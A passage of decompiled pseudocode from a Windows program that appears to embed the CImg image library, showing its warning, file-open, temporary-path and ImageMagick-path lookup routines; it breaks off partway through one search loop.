//----- (0041C800) --------------------------------------------------------
void __cdecl sub_41C800(int a1, int a2)
{
  int *v2; // esi
  int *v3; // eax
  int v4; // ecx
  int *v5; // eax
  int v6; // eax

  if ( dword_4F89F0 )
  {
    v2 = (int *)unknown_libname_86(0x4000);
    v3 = sub_41C6E0();
    WaitForSingleObject((HANDLE)v3[6], 0xFFFFFFFF);
    if ( sub_41AF60(v2, 0x4000, v4, a1, v4, (int)&a2) == -1 )
      sub_41AF90((int)&a2);
    v5 = sub_41C6E0();
    ReleaseMutex((HANDLE)v5[6]);
    v6 = sub_41C750();
    sub_41AF00(v6, (int)"\n%s[CImg] *** Warning ***%s%s\n", byte_4B14F0, byte_4B14F0, (const char *)v2);
    j_j__free(v2);
  }
}
// 41C843: variable 'v4' is possibly undefined
// 447DE6: using guessed type int __cdecl unknown_libname_86(_DWORD);
// 4F89F0: using guessed type int dword_4F89F0;

//----- (0041C8A0) --------------------------------------------------------
__m128 __usercall sub_41C8A0@<xmm0>(__m128 a1@<xmm0>)
{
  return _mm_and_ps(a1, (__m128)xmmword_4EA230);
}
// 4EA230: using guessed type __int128 xmmword_4EA230;

//----- (0041C8C0) --------------------------------------------------------
void __thiscall sub_41C8C0(LPCSTR lpszLongPath)
{
  CHAR *v2; // edi
  char *v3; // ecx
  const CHAR *v4; // esi
  char v5; // al

  if ( lpszLongPath && *lpszLongPath )
  {
    v2 = (CHAR *)unknown_libname_86(260);
    if ( GetShortPathNameA(lpszLongPath, v2, 0x104u) )
    {
      v3 = v2;
      v4 = (const CHAR *)(lpszLongPath - v2);
      do
      {
        v5 = *v3++;
        v3[(_DWORD)v4 - 1] = v5;
      }
      while ( v5 );
    }
    j_j__free(v2);
  }
}
// 447DE6: using guessed type int __cdecl unknown_libname_86(_DWORD);

//----- (0041C910) --------------------------------------------------------
FILE *__thiscall sub_41C910(int this)
{
  char v2; // al
  FILE *v3; // edi
  int v4; // eax
  int v6; // [esp+0h] [ebp-18h]
  char pExceptionObject[16]; // [esp+8h] [ebp-10h] BYREF

  if ( !this )
  {
    sub_41C2D0((int)pExceptionObject, (int)"cimg::fopen(): Specified file path is (null).", v6);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AUCImgArgumentException_cimg_library__);
  }
  if ( *(_BYTE *)this == 45 && ((v2 = *(_BYTE *)(this + 1)) == 0 || v2 == 46) )
  {
    v3 = __acrt_iob_func(1u);
    v4 = _fileno(v3);
    if ( _setmode(v4, 0x8000) == -1 )
    {
LABEL_11:
      sub_41C580((int)pExceptionObject, (int)"cimg::fopen(): Failed to open file '%s' with mode '%s'.", this);
      _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AUCImgIOException_cimg_library__);
    }
  }
  else
  {
    v3 = sub_41CE80((LPCCH)this, "wb");
  }
  if ( !v3 )
    goto LABEL_11;
  return v3;
}
// 41C97D: variable 'v6' is possibly undefined

//----- (0041C9C0) --------------------------------------------------------
char *__thiscall sub_41C9C0(char *this, int a2)
{
  sub_41C1B0(this, a2);
  *(_DWORD *)this = &cimg_library::CImgArgumentException::`vftable';
  return this;
}
// 4B177C: using guessed type void *cimg_library::CImgArgumentException::`vftable';

//----- (0041C9F0) --------------------------------------------------------
char *__thiscall sub_41C9F0(char *this, int a2)
{
  sub_41C1B0(this, a2);
  *(_DWORD *)this = &cimg_library::CImgIOException::`vftable';
  return this;
}
// 4B1954: using guessed type void *cimg_library::CImgIOException::`vftable';

//----- (0041CA20) --------------------------------------------------------
void __fastcall sub_41CA20(int a1, int a2)
{
  FILE *v2; // esi
  int v3; // eax
  int v4; // [esp+0h] [ebp-18h]
  char pExceptionObject[16]; // [esp+8h] [ebp-10h] BYREF

  if ( !a2 )
  {
    sub_41C2D0((int)pExceptionObject, (int)"cimg::fempty(): Specified filename is (null).", v4);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AUCImgArgumentException_cimg_library__);
  }
  v2 = sub_41C910(a2);
  if ( v2 )
  {
    if ( v2 != __acrt_iob_func(0) && v2 != __acrt_iob_func(1u) )
    {
      v3 = fclose(v2);
      if ( v3 )
        sub_41C800((int)"cimg::fclose(): Error code %d returned during file closing.", v3);
    }
  }
  else
  {
    sub_41C800((int)"cimg::fclose(): Specified file is (null).", v4);
  }
}
// 41CA40: variable 'v4' is possibly undefined

//----- (0041CAB0) --------------------------------------------------------
void sub_41CAB0()
{
  int v0; // eax
  int v1; // eax
  int v2; // eax
  int v3; // eax
  int v4; // eax
  int v5; // eax
  int v6; // eax
  int v7; // eax
  int v8; // eax
  int v9; // eax
  int v10; // eax
  int v11; // eax
  int v12; // eax
  int v13; // eax
  int v14; // eax
  int *v15; // esi
  LPCSTR v16; // eax
  int v17; // eax
  LPCSTR v18; // eax
  int v19; // eax
  LPCSTR v20; // eax
  int v21; // eax
  void *v22; // eax
  int v23; // eax
  int v24; // eax

  v0 = sub_41C750();
  sub_41AF00(
    v0,
    (int)"\n %s%sCImg Library %u.%u.%u%s, compiled %s ( %s ) with the following flags:\n\n",
    byte_4B14F0,
    byte_4B14F0,
    2,
    7,
    5,
    byte_4B14F0,
    "Jun  3 2020",
    "12:47:07");
  v1 = sub_41C750();
  sub_41AF00(
    v1,
    (int)"  > Operating System:       %s%-13s%s %s('cimg_OS'=%d)%s\n",
    byte_4B14F0,
    "Windows",
    byte_4B14F0,
    byte_4B14F0,
    2,
    byte_4B14F0);
  v2 = sub_41C750();
  sub_41AF00(v2, (int)"  > CPU endianness:         %s%s Endian%s\n", byte_4B14F0, "Little", byte_4B14F0);
  v3 = sub_41C750();
  sub_41AF00(
    v3,
    (int)"  > Verbosity mode:         %s%-13s%s %s('cimg_verbosity'=%d)%s\n",
    byte_4B14F0,
    "Dialog",
    byte_4B14F0,
    byte_4B14F0,
    2,
    byte_4B14F0);
  v4 = sub_41C750();
  sub_41AF00(
    v4,
    (int)"  > Stricts warnings:       %s%-13s%s %s('cimg_strict_warnings' %s)%s\n",
    byte_4B14F0,
    "No",
    byte_4B14F0,
    byte_4B14F0,
    "undefined",
    byte_4B14F0);
  v5 = sub_41C750();
  sub_41AF00(
    v5,
    (int)"  > Support for C++11:      %s%-13s%s %s('cimg_use_cpp11'=%d)%s\n",
    byte_4B14F0,
    "No",
    byte_4B14F0,
    byte_4B14F0,
    0,
    byte_4B14F0);
  v6 = sub_41C750();
  sub_41AF00(
    v6,
    (int)"  > Using VT100 messages:   %s%-13s%s %s('cimg_use_vt100' %s)%s\n",
    byte_4B14F0,
    "No",
    byte_4B14F0,
    byte_4B14F0,
    "undefined",
    byte_4B14F0);
  v7 = sub_41C750();
  sub_41AF00(
    v7,
    (int)"  > Display type:           %s%-13s%s %s('cimg_display'=%d)%s\n",
    byte_4B14F0,
    "No display",
    byte_4B14F0,
    byte_4B14F0,
    0,
    byte_4B14F0);
  v8 = sub_41C750();
  sub_41AF00(
    v8,
    (int)"  > Using OpenMP:           %s%-13s%s %s('cimg_use_openmp' %s)%s\n",
    byte_4B14F0,
    "No",
    byte_4B14F0,
    byte_4B14F0,
    "undefined",
    byte_4B14F0);
  v9 = sub_41C750();
  sub_41AF00(
    v9,
    (int)"  > Using PNG library:      %s%-13s%s %s('cimg_use_png' %s)%s\n",
    byte_4B14F0,
    "No",
    byte_4B14F0,
    byte_4B14F0,
    "undefined",
    byte_4B14F0);
  v10 = sub_41C750();
  sub_41AF00(
    v10,
    (int)"  > Using JPEG library:     %s%-13s%s %s('cimg_use_jpeg' %s)%s\n",
    byte_4B14F0,
    "No",
    byte_4B14F0,
    byte_4B14F0,
    "undefined",
    byte_4B14F0);
  v11 = sub_41C750();
  sub_41AF00(
    v11,
    (int)"  > Using TIFF library:     %s%-13s%s %s('cimg_use_tiff' %s)%s\n",
    byte_4B14F0,
    "No",
    byte_4B14F0,
    byte_4B14F0,
    "undefined",
    byte_4B14F0);
  v12 = sub_41C750();
  sub_41AF00(
    v12,
    (int)"  > Using Magick++ library: %s%-13s%s %s('cimg_use_magick' %s)%s\n",
    byte_4B14F0,
    "No",
    byte_4B14F0,
    byte_4B14F0,
    "undefined",
    byte_4B14F0);
  v13 = sub_41C750();
  sub_41AF00(
    v13,
    (int)"  > Using FFTW3 library:    %s%-13s%s %s('cimg_use_fftw3' %s)%s\n",
    byte_4B14F0,
    "No",
    byte_4B14F0,
    byte_4B14F0,
    "undefined",
    byte_4B14F0);
  v14 = sub_41C750();
  sub_41AF00(
    v14,
    (int)"  > Using LAPACK library:   %s%-13s%s %s('cimg_use_lapack' %s)%s\n",
    byte_4B14F0,
    "No",
    byte_4B14F0,
    byte_4B14F0,
    "undefined",
    byte_4B14F0);
  v15 = (int *)unknown_libname_86(1024);
  v16 = sub_41D7F0();
  sub_41C190(v15, 1024, (int)"\"%.1020s\"", (int)v16);
  v17 = sub_41C750();
  sub_41AF00(v17, (int)"  > Path of ImageMagick:    %s%-13s%s\n", byte_4B14F0, (const char *)v15, byte_4B14F0);
  v18 = sub_41E2E0();
  sub_41C190(v15, 1024, (int)"\"%.1020s\"", (int)v18);
  v19 = sub_41C750();
  sub_41AF00(v19, (int)"  > Path of GraphicsMagick: %s%-13s%s\n", byte_4B14F0, (const char *)v15, byte_4B14F0);
  v20 = sub_41ED40();
  sub_41C190(v15, 1024, (int)"\"%.1020s\"", (int)v20);
  v21 = sub_41C750();
  sub_41AF00(v21, (int)"  > Path of 'medcon':       %s%-13s%s\n", byte_4B14F0, (const char *)v15, byte_4B14F0);
  v22 = sub_41CFD0();
  sub_41C190(v15, 1024, (int)"\"%.1020s\"", (int)v22);
  v23 = sub_41C750();
  sub_41AF00(v23, (int)"  > Temporary path:         %s%-13s%s\n", byte_4B14F0, (const char *)v15, byte_4B14F0);
  v24 = sub_41C750();
  sub_41AF00(v24, (int)"\n");
  j_j__free(v15);
}
// 447DE6: using guessed type int __cdecl unknown_libname_86(_DWORD);

//----- (0041CE80) --------------------------------------------------------
FILE *__fastcall sub_41CE80(LPCCH lpMultiByteStr, char *Mode)
{
  FILE *result; // eax
  int v4; // eax
  int v5; // edi
  LPWSTR v6; // edi
  int v7; // eax
  int v8; // esi
  LPWSTR v9; // esi
  FILE *v10; // ebx
  int v11; // [esp-Ch] [ebp-5Ch]
  int v12; // [esp-Ch] [ebp-5Ch]
  int v13; // [esp-8h] [ebp-58h]
  int v14; // [esp-8h] [ebp-58h]
  int v15; // [esp-4h] [ebp-54h]
  int v16; // [esp-4h] [ebp-54h]
  int v17; // [esp-4h] [ebp-54h]
  int v18; // [esp-4h] [ebp-54h]
  char v19[16]; // [esp+10h] [ebp-40h] BYREF
  char v20; // [esp+20h] [ebp-30h]
  LPWSTR lpWideCharStr; // [esp+24h] [ebp-2Ch]
  char v22[16]; // [esp+28h] [ebp-28h] BYREF
  char v23; // [esp+38h] [ebp-18h]
  LPWSTR Modea; // [esp+3Ch] [ebp-14h]
  LPCCH lpMultiByteStra; // [esp+40h] [ebp-10h]
  int v26; // [esp+4Ch] [ebp-4h]

  lpMultiByteStra = Mode;
  result = fopen(lpMultiByteStr, Mode);
  if ( result )
    return result;
  v4 = MultiByteToWideChar(0xFDE9u, 0, lpMultiByteStr, -1, 0, 0);
  v5 = v4;
  if ( !v4 )
    return 0;
  sub_421CB0(v19, v4, v11, v13, v15);
  v16 = v5;
  v26 = 0;
  v6 = lpWideCharStr;
  if ( !MultiByteToWideChar(0xFDE9u, 0, lpMultiByteStr, -1, lpWideCharStr, v16)
    || (v7 = MultiByteToWideChar(0xFDE9u, 0, lpMultiByteStra, -1, 0, 0), (v8 = v7) == 0) )
  {
LABEL_13:
    if ( !v20 )
      j_j__free(v6);
    return 0;
  }
  sub_421CB0(v22, v7, v12, v14, v17);
  v18 = v8;
  v9 = Modea;
  if ( !MultiByteToWideChar(0xFDE9u, 0, lpMultiByteStra, -1, Modea, v18) )
  {
    if ( !v23 )
      j_j__free(v9);
    goto LABEL_13;
  }
  v10 = _wfopen(v6, v9);
  if ( !v23 )
    j_j__free(v9);
  if ( !v20 )
    j_j__free(v6);
  return v10;
}
// 41CEE5: variable 'v11' is possibly undefined
// 41CEE5: variable 'v13' is possibly undefined
// 41CEE5: variable 'v15' is possibly undefined
// 41CF29: variable 'v12' is possibly undefined
// 41CF29: variable 'v14' is possibly undefined
// 41CF29: variable 'v17' is possibly undefined
// 41CE80: using guessed type char var_40[16];
// 41CE80: using guessed type char var_28[16];

//----- (0041CFD0) --------------------------------------------------------
void *sub_41CFD0()
{
  int *v0; // eax
  int *v1; // eax
  unsigned int i; // edi
  int *v3; // eax
  unsigned int v4; // esi
  int *v5; // eax
  int v6; // edx
  int *v7; // eax
  unsigned int v8; // esi
  int *v9; // eax
  char v10; // dl
  int *v11; // eax
  unsigned int v12; // esi
  int *v13; // eax
  int *v14; // eax
  unsigned int v15; // esi
  int *v16; // eax
  int *v17; // eax
  char *v18; // edi
  void *v19; // eax
  int *v20; // esi
  int v21; // ebx
  FILE *v22; // eax
  FILE *v23; // ebx
  int v24; // eax
  int *v25; // eax
  int v27; // [esp-Ch] [ebp-6Ch]
  int v28; // [esp-Ch] [ebp-6Ch]
  int v29; // [esp-8h] [ebp-68h]
  int v30; // [esp-8h] [ebp-68h]
  int v31; // [esp-4h] [ebp-64h]
  int v32; // [esp-4h] [ebp-64h]
  int v33; // [esp+0h] [ebp-60h]
  char pExceptionObject[16]; // [esp+10h] [ebp-50h] BYREF
  int v35[4]; // [esp+20h] [ebp-40h] BYREF
  char v36; // [esp+30h] [ebp-30h]
  char *Destination; // [esp+34h] [ebp-2Ch]
  int v38[4]; // [esp+38h] [ebp-28h] BYREF
  char v39; // [esp+48h] [ebp-18h]
  char *Source; // [esp+4Ch] [ebp-14h]
  FILE *Stream; // [esp+50h] [ebp-10h]
  int v42; // [esp+5Ch] [ebp-4h]

  if ( dword_500C24 > *(_DWORD *)(*(_DWORD *)NtCurrentTeb()->ThreadLocalStoragePointer + 4) )
  {
    _Init_thread_header(&dword_500C24);
    if ( dword_500C24 == -1 )
    {
      dword_500A90 = 0;
      dword_500A94 = 0;
      dword_500A98 = 0;
      dword_500A9C = 0;
      byte_500AA0 = 0;
      dword_500AA4 = 0;
      atexit(sub_48DB00);
      _Init_thread_footer(&dword_500C24);
    }
  }
  v0 = sub_41C6E0();
  WaitForSingleObject((HANDLE)v0[7], 0xFFFFFFFF);
  if ( !dword_500AA4 )
  {
    sub_422060((int)&dword_500A90, 1024, 1, 1, 1);
    sub_422290(v35, 1024, v27, v29, v31);
    v42 = 0;
    sub_422290(v38, 256, v28, v30, v32);
    LOBYTE(v42) = 1;
    v1 = sub_41C6E0();
    WaitForSingleObject((HANDLE)v1[6], 0xFFFFFFFF);
    for ( i = 0; i < 8; ++i )
    {
      v3 = sub_41C6E0();
      WaitForSingleObject((HANDLE)v3[4], 0xFFFFFFFF);
      dword_4F89F4 = 1103515245 * dword_4F89F4 + 12345;
      v4 = dword_4F89F4;
      v5 = sub_41C6E0();
      ReleaseMutex((HANDLE)v5[4]);
      v6 = (int)((double)v4 / 4294967295.0 * 65535.0) % 3;
      if ( v6 )
      {
        if ( v6 == 1 )
        {
          v11 = sub_41C6E0();
          WaitForSingleObject((HANDLE)v11[4], 0xFFFFFFFF);
          dword_4F89F4 = 1103515245 * dword_4F89F4 + 12345;
          v12 = dword_4F89F4;
          v13 = sub_41C6E0();
          ReleaseMutex((HANDLE)v13[4]);
          v10 = (int)((double)v12 / 4294967295.0 * 65535.0) % 26 + 97;
        }
        else
        {
          v14 = sub_41C6E0();
          WaitForSingleObject((HANDLE)v14[4], 0xFFFFFFFF);
          dword_4F89F4 = 1103515245 * dword_4F89F4 + 12345;
          v15 = dword_4F89F4;
          v16 = sub_41C6E0();
          ReleaseMutex((HANDLE)v16[4]);
          v10 = (int)((double)v15 / 4294967295.0 * 65535.0) % 26 + 65;
        }
      }
      else
      {
        v7 = sub_41C6E0();
        WaitForSingleObject((HANDLE)v7[4], 0xFFFFFFFF);
        dword_4F89F4 = 1103515245 * dword_4F89F4 + 12345;
        v8 = dword_4F89F4;
        v9 = sub_41C6E0();
        ReleaseMutex((HANDLE)v9[4]);
        v10 = (int)((double)v8 / 4294967295.0 * 65535.0) % 10 + 48;
      }
      byte_500A7C[i] = v10;
    }
    v17 = sub_41C6E0();
    ReleaseMutex((HANDLE)v17[6]);
    v18 = Source;
    sub_41C190((int *)Source, v38[0], (int)"%s.tmp", (int)byte_500A7C);
    v19 = getenv("TMP");
    v20 = (int *)Destination;
    v21 = v35[0];
    if ( v19 || (Stream = (FILE *)getenv("TEMP"), sub_41C8C0((LPCSTR)Stream), (v19 = Stream) != 0) )
    {
      sub_41C190((int *)dword_500AA4, dword_500A90, (int)"%s", (int)v19);
      sub_41C190(v20, v21, (int)"%s%c%s", (int)dword_500AA4);
      Stream = sub_41CE80((LPCCH)v20, "wb");
      if ( Stream )
        goto LABEL_27;
    }
    sub_41C190((int *)dword_500AA4, dword_500A90, (int)"%s", (int)"C:\\WINNT\\Temp");
    sub_41C190(v20, v21, (int)"%s%c%s", (int)dword_500AA4);
    Stream = sub_41CE80((LPCCH)v20, "wb");
    if ( Stream )
      goto LABEL_27;
    sub_41C190((int *)dword_500AA4, dword_500A90, (int)"%s", (int)"C:\\WINDOWS\\Temp");
    sub_41C190(v20, v21, (int)"%s%c%s", (int)dword_500AA4);
    Stream = sub_41CE80((LPCCH)v20, "wb");
    if ( Stream )
      goto LABEL_27;
    sub_41C190((int *)dword_500AA4, dword_500A90, (int)"%s", (int)"C:\\Temp");
    sub_41C190(v20, v21, (int)"%s%c%s", (int)dword_500AA4);
    Stream = sub_41CE80((LPCCH)v20, "wb");
    if ( Stream )
      goto LABEL_27;
    sub_41C190((int *)dword_500AA4, dword_500A90, (int)"%s", (int)"C:");
    sub_41C190(v20, v21, (int)"%s%c%s", (int)dword_500AA4);
    Stream = sub_41CE80((LPCCH)v20, "wb");
    if ( Stream )
      goto LABEL_27;
    sub_41C190((int *)dword_500AA4, dword_500A90, (int)"%s", (int)"D:\\WINNT\\Temp");
    sub_41C190(v20, v21, (int)"%s%c%s", (int)dword_500AA4);
    Stream = sub_41CE80((LPCCH)v20, "wb");
    if ( Stream )
      goto LABEL_27;
    sub_41C190((int *)dword_500AA4, dword_500A90, (int)"%s", (int)"D:\\WINDOWS\\Temp");
    sub_41C190(v20, v21, (int)"%s%c%s", (int)dword_500AA4);
    Stream = sub_41CE80((LPCCH)v20, "wb");
    if ( Stream
      || (sub_41C190((int *)dword_500AA4, dword_500A90, (int)"%s", (int)"D:\\Temp"),
          sub_41C190(v20, v21, (int)"%s%c%s", (int)dword_500AA4),
          (Stream = sub_41CE80((LPCCH)v20, "wb")) != 0)
      || (sub_41C190((int *)dword_500AA4, dword_500A90, (int)"%s", (int)"D:"),
          sub_41C190(v20, v21, (int)"%s%c%s", (int)dword_500AA4),
          (Stream = sub_41CE80((LPCCH)v20, "wb")) != 0) )
    {
LABEL_27:
      v22 = __acrt_iob_func(0);
      v23 = Stream;
    }
    else
    {
      *(_BYTE *)dword_500AA4 = 0;
      strncpy((char *)v20, v18, v21 - 1);
      v23 = sub_41CE80((LPCCH)v20, "wb");
      if ( !v23 )
      {
        sub_41C7C0(7, 0);
        sub_41C580(
          (int)pExceptionObject,
          (int)"cimg::temporary_path(): Failed to locate path for writing temporary files.\n",
          v33);
        _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AUCImgIOException_cimg_library__);
      }
      v22 = __acrt_iob_func(0);
    }
    if ( v23 != v22 && v23 != __acrt_iob_func(1u) )
    {
      v24 = fclose(v23);
      if ( v24 )
        sub_41C800((int)"cimg::fclose(): Error code %d returned during file closing.", v24);
    }
    remove((const char *)v20);
    if ( !v39 )
      j_j__free(v18);
    if ( !v36 )
      j_j__free(v20);
  }
  v25 = sub_41C6E0();
  ReleaseMutex((HANDLE)v25[7]);
  return dword_500AA4;
}
// 41D0B5: variable 'v27' is possibly undefined
// 41D0B5: variable 'v29' is possibly undefined
// 41D0B5: variable 'v31' is possibly undefined
// 41D0CC: variable 'v28' is possibly undefined
// 41D0CC: variable 'v30' is possibly undefined
// 41D0CC: variable 'v32' is possibly undefined
// 41D69D: variable 'v33' is possibly undefined
// 447A70: using guessed type _DWORD __cdecl _Init_thread_footer(_DWORD);
// 447ABA: using guessed type _DWORD __cdecl _Init_thread_header(_DWORD);
// 4F89F4: using guessed type int dword_4F89F4;
// 500A90: using guessed type int dword_500A90;
// 500A94: using guessed type int dword_500A94;
// 500A98: using guessed type int dword_500A98;
// 500A9C: using guessed type int dword_500A9C;
// 500AA0: using guessed type char byte_500AA0;
// 500C24: using guessed type int dword_500C24;
// 41CFD0: using guessed type int var_40[4];
// 41CFD0: using guessed type int var_28[4];

//----- (0041D6C0) --------------------------------------------------------
LPSTR sub_41D6C0()
{
  int *v0; // eax
  char *v1; // eax
  LPSTR v2; // ecx
  int *v3; // eax

  if ( dword_500A88 > *(_DWORD *)(*(_DWORD *)NtCurrentTeb()->ThreadLocalStoragePointer + 4) )
  {
    _Init_thread_header(&dword_500A88);
    if ( dword_500A88 == -1 )
    {
      dword_500C2C = 0;
      dword_500C30 = 0;
      dword_500C34 = 0;
      dword_500C38 = 0;
      byte_500C3C = 0;
      Destination = 0;
      atexit(sub_48DB20);
      _Init_thread_footer(&dword_500A88);
    }
  }
  v0 = sub_41C6E0();
  WaitForSingleObject((HANDLE)v0[7], 0xFFFFFFFF);
  if ( !Destination )
  {
    sub_422060((int)&dword_500C2C, 260, 1, 1, 1);
    *Destination = 0;
    if ( !SHGetSpecialFolderPathA(0, Destination, 38, 0) )
    {
      v1 = getenv("PROGRAMFILES");
      if ( v1 )
      {
        strncpy(Destination, v1, 0x103u);
      }
      else
      {
        v2 = Destination;
        *(_QWORD *)Destination = 0x52474F52505C3A43i64;
        *((_DWORD *)v2 + 2) = 3243585;
      }
    }
  }
  v3 = sub_41C6E0();
  ReleaseMutex((HANDLE)v3[7]);
  return Destination;
}
// 447A70: using guessed type _DWORD __cdecl _Init_thread_footer(_DWORD);
// 447ABA: using guessed type _DWORD __cdecl _Init_thread_header(_DWORD);
// 500A88: using guessed type int dword_500A88;
// 500C2C: using guessed type int dword_500C2C;
// 500C30: using guessed type int dword_500C30;
// 500C34: using guessed type int dword_500C34;
// 500C38: using guessed type int dword_500C38;
// 500C3C: using guessed type char byte_500C3C;

//----- (0041D7F0) --------------------------------------------------------
LPCSTR sub_41D7F0()
{
  int *v0; // eax
  char v1; // bl
  LPSTR v2; // eax
  int v3; // ecx
  const char *v4; // eax
  FILE *v5; // esi
  int v6; // eax
  int i; // edi
  FILE *v8; // esi
  int v9; // eax
  int j; // edi
  FILE *v11; // esi
  int v12; // eax
  int k; // edi
  FILE *v14; // esi
  int v15; // eax
  int m; // edi
  FILE *v17; // esi
  int v18; // eax
  int n; // edi
  FILE *v20; // esi
  int v21; // eax
  int ii; // edi
  FILE *v23; // esi
  int v24; // eax
  int jj; // edi
  FILE *v26; // esi
  int v27; // eax
  int kk; // edi
  FILE *v29; // esi
  int v30; // eax
  int mm; // edi
  FILE *v32; // esi
  int v33; // eax
  int nn; // edi
  FILE *v35; // esi
  int v36; // eax
  int i1; // edi
  FILE *v38; // esi
  int v39; // eax
  int i2; // edi
  FILE *v41; // esi
  int v42; // eax
  int i3; // edi
  FILE *v44; // esi
  int v45; // eax
  int i4; // edi
  FILE *v47; // esi
  int v48; // eax
  int i5; // edi
  FILE *v50; // esi
  int v51; // eax
  int i6; // edi
  FILE *v53; // esi
  int v54; // eax
  int i7; // edi
  FILE *v56; // esi
  int v57; // eax
  int v58; // edi
  FILE *v59; // esi
  int v60; // eax
  const CHAR *v61; // esi
  CHAR *v62; // edi
  CHAR *v63; // ecx
  int v64; // esi
  CHAR v65; // al
  int *v66; // eax
  int v68; // [esp+Ch] [ebp-Ch]
  int v69; // [esp+10h] [ebp-8h]
  int v70; // [esp+14h] [ebp-4h]

  if ( dword_500AD0 > *(_DWORD *)(*(_DWORD *)NtCurrentTeb()->ThreadLocalStoragePointer + 4) )
  {
    _Init_thread_header(&dword_500AD0);
    if ( dword_500AD0 == -1 )
    {
      dword_5009E0 = 0;
      dword_5009E4 = 0;
      dword_5009E8 = 0;
      dword_5009EC = 0;
      byte_5009F0 = 0;
      lpMultiByteStr = 0;
      atexit(sub_48DB40);
      _Init_thread_footer(&dword_500AD0);
    }
  }
  v0 = sub_41C6E0();
  WaitForSingleObject((HANDLE)v0[7], 0xFFFFFFFF);
  if ( !lpMultiByteStr )
  {
    sub_422060((int)&dword_5009E0, 1024, 1, 1, 1);
    v1 = 0;
    v2 = sub_41D6C0();
    v3 = 0;
    v69 = (int)v2;
    v68 = 0;
    do
    {
      if ( v1 )
        break;
      v4 = "convert";
      if ( !v3 )
        v4 = "magick";
      v70 = (int)v4;
      sub_41C190((int *)lpMultiByteStr, dword_5009E0, (int)".\\%s.exe", (int)v4);
      v5 = sub_41CE80(lpMultiByteStr, "r");
      if ( v5 )
      {
        if ( v5 != __acrt_iob_func(0) && v5 != __acrt_iob_func(1u) )
        {
          v6 = fclose(v5);
          if ( v6 )
            sub_41C800((int)"cimg::fclose(): Error code %d returned during file closing.", v6);
        }
        v1 = 1;
      }
      for ( i = 32; i >= 10; --i )
      {
        if ( v1 )
          break;
        sub_41C190((int *)lpMultiByteStr, dword_5009E0, (int)"%s\\IMAGEM~1.%.2d-\\%s.exe", v69);
        v8 = sub_41CE80(lpMultiByteStr, "r");
        if ( v8 )
        {
          if ( v8 != __acrt_iob_func(0) && v8 != __acrt_iob_func(1u) )
          {
            v9 = fclose(v8);
            if ( v9 )
              sub_41C800((int)"cimg::fclose(): Error code %d returned during file closing.", v9);
          }
          v1 = 1;
        }
      }
      for ( j = 9; j >= 0; --j )
      {
        if ( v1 )
          break;
        sub_41C190((int *)lpMultiByteStr, dword_5009E0, (int)"%s\\IMAGEM~1.%d-Q\\%s.exe", v69);
        v11 = sub_41CE80(lpMultiByteStr, "r");
        if ( v11 )
        {
          if ( v11 != __acrt_iob_func(0) && v11 != __acrt_iob_func(1u) )
          {
            v12 = fclose(v11);
            if ( v12 )
              sub_41C800((int)"cimg::fclose(): Error code %d returned during file closing.", v12);
          }
          v1 = 1;
        }
      }
      for ( k = 32; k >= 0; --k )
      {
        if ( v1 )
          break;
        sub_41C190((int *)lpMultiByteStr, dword_5009E0, (int)"%s\\IMAGEM~1.%d\\%s.exe", v69);
        v14 = sub_41CE80(lpMultiByteStr, "r");
        if ( v14 )
        {
          if ( v14 != __acrt_iob_func(0) && v14 != __acrt_iob_func(1u) )
          {
            v15 = fclose(v14);
            if ( v15 )
              sub_41C800((int)"cimg::fclose(): Error code %d returned during file closing.", v15);
          }
          v1 = 1;
        }
      }
      for ( m = 32; m >= 10; --m )
      {
        if ( v1 )
          break;
        sub_41C190((int *)lpMultiByteStr, dword_5009E0, (int)"%s\\IMAGEM~1.%.2d-\\VISUA~1\\BIN\\%s.exe", v69);
        v17 = sub_41CE80(lpMultiByteStr, "r");
        if ( v17 )
        {
          if ( v17 != __acrt_iob_func(0) && v17 != __acrt_iob_func(1u) )
          {
            v18 = fclose(v17);
            if ( v18 )
              sub_41C800((int)"cimg::fclose(): Error code %d returned during file closing.", v18);
          }
          v1 = 1;
        }
      }
      for ( n = 9; n >= 0; --n )
      {
        if ( v1 )
          break;
        sub_41C190((int *)lpMultiByteStr, dword_5009E0, (int)"%s\\IMAGEM~1.%d-Q\\VISUA~1\\BIN\\%s.exe", v69);
        v20 = sub_41CE80(lpMultiByteStr, "r");
        if ( v20 )
        {
          if ( v20 != __acrt_iob_func(0) && v20 != __acrt_iob_func(1u) )
          {
            v21 = fclose(v20);
            if ( v21 )
              sub_41C800((int)"cimg::fclose(): Error code %d returned during file closing.", v21);
          }
          v1 = 1;
        }
      }
      for ( ii = 32; ii >= 0; --ii )
      {
        if ( v1 )
          break;
        sub_41C190((int *)lpMultiByteStr, dword_5009E0, (int)"%s\\IMAGEM~1.%d\\VISUA~1\\BIN\\%s.exe", v69);
        v23 = sub_41CE80(lpMultiByteStr, "r");
        if ( v23 )
        {
          if ( v23 != __acrt_iob_func(0) && v23 != __acrt_iob_func(1u) )
          {
            v24 = fclose(v23);
            if ( v24 )
              sub_41C800((int)"cimg::fclose(): Error code %d returned during file closing.", v24);
          }
          v1 = 1;
        }
      }
      for ( jj = 32; jj >= 10; --jj )
      {
        if ( v1 )
          break;
        sub_41C190((int *)lpMultiByteStr, dword_5009E0, (int)"C:\\IMAGEM~1.%.2d-\\%s.exe", jj);
        v26 = sub_41CE80(lpMultiByteStr, "r");
        if ( v26 )
        {
          if ( v26 != __acrt_iob_func(0) && v26 != __acrt_iob_func(1u) )
          {
            v27 = fclose(v26);
            if ( v27 )
              sub_41C800((int)"cimg::fclose(): Error code %d returned during file closing.", v27);
          }
          v1 = 1;
        }
      }
      for ( kk = 9; kk >= 0; --kk )
      {
        if ( v1 )
          break;
        sub_41C190((int *)lpMultiByteStr, dword_5009E0, (int)"C:\\IMAGEM~1.%d-Q\\%s.exe", kk);
        v29 = sub_41CE80(lpMultiByteStr, "r");
        if ( v29 )
        {
          if ( v29 != __acrt_iob_func(0) && v29 != __acrt_iob_func(1u) )
          {
            v30 = fclose(v29);
            if ( v30 )
              sub_41C800((int)"cimg::fclose(): Error code %d returned during file closing.", v30);
          }
          v1 = 1;
        }
      }
      for ( mm = 32; mm >= 0; --mm )
      {
        if ( v1 )
          break;
        sub_41C190((int *)lpMultiByteStr, dword_5009E0, (int)"C:\\IMAGEM~1.%d\\%s.exe", mm);
        v32 = sub_41CE80(lpMultiByteStr, "r");
        if ( v32 )
        {
          if ( v32 != __acrt_iob_func(0) && v32 != __acrt_iob_func(1u) )
          {
